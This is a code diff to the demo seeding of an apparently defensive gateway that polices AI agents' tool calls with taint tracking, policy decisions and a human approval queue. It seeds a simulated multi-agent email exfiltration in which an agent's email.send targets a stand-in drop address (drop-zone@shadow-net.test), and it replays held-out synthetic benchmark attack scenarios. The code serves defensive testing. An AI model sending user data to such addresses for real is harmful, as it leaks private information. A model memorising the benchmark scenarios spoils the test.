@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import json
 import os
+from collections.abc import Callable
 from dataclasses import dataclass, field
 from datetime import UTC, datetime
 from pathlib import Path
@@ -46,6 +47,7 @@ class AppState:
     session: SessionMeta = field(default_factory=SessionMeta)
     last_reconstruction: list[dict[str, Any]] = field(default_factory=list)
     candidates: list[CandidateRecord] = field(default_factory=list)
+    traces: list[dict[str, Any]] = field(default_factory=list)
 
     def overview(self) -> dict[str, Any]:
         counts = self.audit.count_by_decision()
@@ -178,7 +180,10 @@ def seed_demo_session() -> dict[str, Any]:
         attach_reconstruction=True,
     )
 
-    read = gateway.invoke("email.read", {}, agent_id="agent_a", raise_on_deny=False)
+    calls: list[dict[str, Any]] = []
+    invoke = _tracking(gateway.invoke, state, calls)
+
+    read = invoke("email.read", {}, agent_id="agent_a", raise_on_deny=False)
     assert read.result_span is not None
     body = json.dumps(read.result, sort_keys=True, default=str)
     state.candidates = [
@@ -235,7 +240,7 @@ def seed_demo_session() -> dict[str, Any]:
     gateway.candidates = list(state.candidates)
 
     try:
-        attack = gateway.invoke(
+        attack = invoke(
             "email.send",
             {
                 "to": "drop-zone@shadow-net.test",
@@ -267,7 +272,7 @@ def seed_demo_session() -> dict[str, Any]:
     )
     gateway.candidates = list(state.candidates)
     gateway.user_authorized_values = {"finance-ops@partner-alpha.test"}
-    benign = gateway.invoke(
+    benign = invoke(
         "email.send",
         {
             "to": "finance-ops@partner-alpha.test",
@@ -284,6 +289,38 @@ def seed_demo_session() -> dict[str, Any]:
         parent_span_id=summary.span_id, key="suspect_rcpt", agent_id="agent_a"
     )
 
+    # Uninstrumented agent: HIGH-risk sends with no declared lineage and no grant.
+    # Policy asks a human (CONFIRM); with a durable queue configured they appear
+    # on the approval screen.
+    confirmation = _seed_confirmation_service()
+    if confirmation is not None:
+        gateway.confirmation = confirmation
+    gateway.user_authorized_values = set()
+    gateway.authorization_grants = []
+    for to, subject in (
+        ("auditor@partner-beta.test", "quarterly controls"),
+        ("legal-hold@partner-gamma.test", "retention notice"),
+    ):
+        invoke(
+            "email.send",
+            {"to": to, "subject": subject, "body": "see attached summary"},
+            agent_id="agent_c",
+            raise_on_deny=False,
+        )
+    state.traces = [
+        {
+            "trace_id": "demo-email-exfil",
+            "label": "Multi-agent email exfiltration + benign invoice mail",
+            "kind": "attack",
+            "family": "multi_agent",
+            "source": "demo_seed",
+            "span_ids": [sp.span_id for sp in state.registry.store.list_spans()],
+            "call_ids": [d.call_id for d in state.audit.list_decisions(limit=500)],
+            "calls": calls,
+        }
+    ]
+    batch_note = _seed_benchmark_traces(state)
+
     state.session = SessionMeta(
         mode="demo_seed",
         label=(
@@ -296,6 +333,7 @@ def seed_demo_session() -> dict[str, Any]:
             "Not a claim of real-world production telemetry.",
             f"Attack decision={attack_decision.decision.value} policy={attack_decision.policy_id}",
             f"Benign decision={benign.decision.decision.value} policy={benign.decision.policy_id}",
+            batch_note,
         ],
     )
     return {
@@ -309,6 +347,123 @@ def seed_demo_session() -> dict[str, Any]:
         "attack_call_id": attack_decision.call_id,
         "benign_call_id": benign.decision.call_id,
     }
+
+
+def _tracking(
+    invoke: Callable[..., Any], state: AppState, calls: list[dict[str, Any]]
+) -> Callable[..., Any]:
+    """Wrap gateway.invoke to record which spans and decisions each call created."""
+
+    def wrapped(*args: Any, **kwargs: Any) -> Any:
+        spans_before = {sp.span_id for sp in state.registry.store.list_spans()}
+        calls_before = {d.call_id for d in state.audit.list_decisions(limit=500)}
+        try:
+            return invoke(*args, **kwargs)
+        finally:
+            calls.append(
+                {
+                    "call_ids": [
+                        d.call_id
+                        for d in state.audit.list_decisions(limit=500)
+                        if d.call_id not in calls_before
+                    ],
+                    "span_ids": [
+                        sp.span_id
+                        for sp in state.registry.store.list_spans()
+                        if sp.span_id not in spans_before
+                    ],
+                }
+            )
+
+    return wrapped
+
+
+SEED_SCENARIOS = int(os.environ.get("AGENTTAINT_SEED_SCENARIOS", "16"))
+
+
+def _seed_benchmark_traces(state: AppState) -> str:
+    """Replay held-out benchmark scenarios through real gateways into shared stores.
+
+    Every decision, span and edge comes from live enforcement (combined defense,
+    fixture embedder). Scenarios are synthetic and labeled as such.
+    """
+    try:
+        from agenttaint_benchmark.defenses import DefenseConfig
+        from agenttaint_benchmark.loader import load_scenarios
+        from agenttaint_benchmark.runner import run_scenario
+        from agenttaint_benchmark.schema import AblationModeName, DefenseMode
+    except ImportError:
+        return "Benchmark package not installed: replay of synthetic scenarios skipped."
+    if SEED_SCENARIOS <= 0:
+        return "Synthetic scenario replay disabled (AGENTTAINT_SEED_SCENARIOS=0)."
+    _, scenarios = load_scenarios("test")
+    _, challenge = load_scenarios("challenge")
+    attacks = [s for s in scenarios if s.kind.value == "attack"]
+    benign = [s for s in scenarios if s.kind.value == "benign"]
+    picked: list[Any] = []
+    while len(picked) < SEED_SCENARIOS and (attacks or benign):
+        for pool in (attacks, attacks, benign):
+            if pool and len(picked) < SEED_SCENARIOS:
+                picked.append(pool.pop(0))
+    picked.extend(challenge)
+    defense = DefenseConfig(DefenseMode.COMBINED, AblationModeName.COMBINED)
+    confirmation = _seed_confirmation_service()
+    for scenario in picked:
+        spans_before = {sp.span_id for sp in state.registry.store.list_spans()}
+        calls_before = {d.call_id for d in state.audit.list_decisions(limit=500)}
+        result = run_scenario(
+            scenario,
+            defense,
+            registry=state.registry,
+            audit=state.audit,
+            confirmation=confirmation,
+        )
+        new_spans = [
+            sp.span_id for sp in state.registry.store.list_spans() if sp.span_id not in spans_before
+        ]
+        decisions = state.audit.list_decisions(limit=500)
+        new_calls = [d.call_id for d in decisions if d.call_id not in calls_before]
+        state.traces.append(
+            {
+                "trace_id": scenario.scenario_id,
+                "label": scenario.description or scenario.scenario_id,
+                "kind": scenario.kind.value,
+                "family": scenario.family.value,
+                "source": "benchmark_test_split",
+                "decision": result.decision,
+                "span_ids": new_spans,
+                "call_ids": new_calls,
+                "calls": [{"call_ids": new_calls, "span_ids": new_spans}],
+            }
+        )
+    note = (
+        f"{len(picked)} held-out and challenge synthetic benchmark scenarios replayed through real "
+        "gateways (combined defense)."
+    )
+    if confirmation is not None:
+        note += " CONFIRM decisions are queued for human approval."
+    return note
+
+
+def _seed_confirmation_service() -> Any | None:
+    """Durable confirmation queue shared with the approval routes, if configured."""
+    url = os.environ.get("AGENTTAINT_SECURITY_DB_URL", "").strip()
+    approver = os.environ.get("AGENTTAINT_APPROVER_TOKEN", "").strip()
+    dashboard = os.environ.get("AGENTTAINT_DASHBOARD_TOKEN", "").strip()
+    if not url or not (approver or dashboard):
+        return None
+    from datetime import timedelta
+
+    from agenttaint_agent_sdk.persistence import DurableConfirmationService
+    from agenttaint_core.config import ConfigurationError, resolve_confirm_secret
+
+    try:
+        secret = resolve_confirm_secret()
+    except ConfigurationError:
+        return None
+    return DurableConfirmationService(
+        secret=secret, database_url=url, default_ttl=timedelta(minutes=30)
+    )
 
 
 def _truncate_redacted(value: str | None, limit: int = 280) -> str | None:
